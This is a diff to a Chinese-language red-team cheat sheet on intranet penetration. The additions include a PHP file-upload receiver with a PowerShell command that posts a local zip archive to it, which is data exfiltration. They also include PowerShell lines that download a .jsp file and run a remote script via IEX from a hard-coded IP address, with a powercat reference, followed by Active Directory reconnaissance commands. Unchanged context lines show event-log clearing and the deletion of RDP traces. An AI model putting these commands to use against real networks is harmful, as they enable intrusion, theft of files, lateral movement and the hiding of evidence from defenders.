@@ -1,8 +1,9 @@
-# Intranet Penetration Tips
+# Intranet Penetration CheetSheets
+
+# 内网渗透技巧
 
 Modified by: [z3r0yu](https://twitter.com/zeroyu_)
 Blog: http://zeroyu.xyz
-PS: 主要增加的内容是自己在做redteam时候的一些技巧
 
 Table of Contents
 =================
@@ -450,6 +451,27 @@ powershell
 $p = New-Object System.Net.WebClient 
 $p.DownloadFile("http://domain/file","C:%homepath%file") 
 ```
+
+回传文件
+```
+php起服务： php -S 0.0.0.0:8888
+<?php
+$file = date("Hism");
+file_put_contents($file, file_get_contents("php://input"));
+
+powershell回传：powershell iwr ip:8888/upload.php -method POST -infile C:\xx\xx\xx.zip
+```
+下载文件
+```
+powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://95.163.202.147:8000/vendor.jsp', 'a.jsp')
+```
+
+下载并执行
+```
+powershell IEX (New-Object System.Net.Webclient).DownloadString('http://95.163.202.147:8000/ooo.ps1')
+('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
+```
+
 vbs脚本 
 ```
 Set args = Wscript.Arguments
@@ -773,9 +795,16 @@ net user /domain ------> 查询域用户
 net group /domain ------> 查询域里面的工作组
 net group "domain admins" /domain ------> 查询域管理员用户组
 net localgroup administrators /domain ------> 登录本机的域管理员
-net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 net group "Domain controllers" -------> 查看域控制器(如果有多台)
-net view ------> 查询同一域内机器列表 net view /domain ------> 查询域列表
+net localgroup administrators workgroup\user001 /add ----->域用户添加到本机 
+net group "domain controllers" -------> 查看域控制器(如果有多台)
+net view ------> 查询同一域内机器列表 
+net view /domain ------> 查询域列表
+net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
 net view /domain:domainname
+net view \\dc   查看dc域内共享文件
+net time /domain 
+net config workstation   当前登录域 - 计算机名 - 用户名
+net use \\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
 ```
 dsquery 
 ```
@@ -786,6 +815,15 @@ dsquery subnet ------>列出该域内网段划分
 dsquery group && net group /domain ------>列出该域内分组 
 dsquery ou ------>列出该域内组织单位 
 dsquery server && net time /domain------>列出该域内域控制器 
+```
+query
+```
+query user || qwinsta------>查看当前在线用户
+```
+tasklist
+```
+tasklist /svc
+tasklist /S ip /U domain\username /P /V 查看远程计算机tasklist
 ```
 
 ### 第三方信息收集 
@@ -1699,3 +1737,4 @@ clearev
 @del "%USERPROFILE%\My Documents\Default.rdp" /a
 @exit
 ```
+
